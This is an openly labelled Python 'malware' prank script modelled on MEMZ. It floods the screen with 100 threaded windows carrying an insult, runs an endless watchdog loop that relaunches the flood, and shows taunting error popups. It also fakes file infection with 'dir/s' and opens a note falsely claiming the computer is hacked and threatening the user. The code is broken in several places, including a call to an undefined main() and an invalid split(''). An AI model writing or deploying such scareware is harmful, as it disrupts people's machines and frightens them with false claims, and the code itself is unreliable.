from tkinter.messagebox import *
import os
import time
import random
import subprocess
########################################################################################################################################
def fuckubitch():
    import tkinter as tk
    import random
    import threading
    import time
    def boom():
        window = tk.Tk()
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        a = random.randrange(0, width)
        b = random.randrange(0, height)
        window.title('你是一个傻狍子')
        window.geometry("200x50" + "+" + str(a) + "+" + str(b))
        tk.Label(window, text='你是一个傻狍子', bg='green',
                 font=('微软雅黑', 17), width=20, height=4).pack()
        window.mainloop()


    threads = []
    for i in range(100):
        t = threading.Thread(target=boom)
        threads.append(t)
        threads[i].start()
########################################################################################################################################
def watchdog():
    while True:
        try:
            subprocess.call(["shutdown","-a"])
            fuckubitch()
        except:
            pass
########################################################################################################################################
def s1():
    askyesno(title="L",message="Still usin' this puter?\nxD\nlol")
def s2():
    showerror(message="yee")
def s3():
    showerror(message="""○( ＾皿＾)っ""")
def s4():
    showerror(message="ㄟ( ▔, ▔ )ㄏ")
def s5():
    showerror(message="Long live the MEMZ!!!!!!!!!!!")
def s6():
    showerror(message="SOB")
def s7():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
    del x
def s8():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
    del x
def s9():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
    del x
def s0():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
    del x
def sq():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
    del x
def sw():
    x=""
    for i in range(random.randint(8,24)):
        x+=random.choice("`1234567890--=~!@#$%^&*()_+qwertyuiop[]]\\QWERTYUIOP{}|asdfghjkl;'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<>?".split(""))
    showerror(message=x)
def sr():
    showerror(message="┏ (^ω^)=☞")
    del x
#######################################################################################################################################
def e1():
    os.system("color 0a&&title \"Infecting your files...\"&&dir/s")
#######################################################################################################################################
def note():
    #
    with open(".\\note.txt","w") as f:
        f.write("""Your computer is hacked!!!
It will not be a usable machine any longer, so use it as long as you can!
=)

Trying to kill this malware will only make it die faster, so don't try it :D

WE wish you have a good luck.

By wjz


























































Prompt: If you wanna live, remember that there isn't only one of us.""")
        f.close()
    os.system("start notepad.exe .\\note.txt")
    
if askyesno(title="WARNING!",message="This malware is no joke, continue?")==True:
    main()

else:
    showinfo(title="Malware cancelled.",message="Malware cancelled successfully.")
    
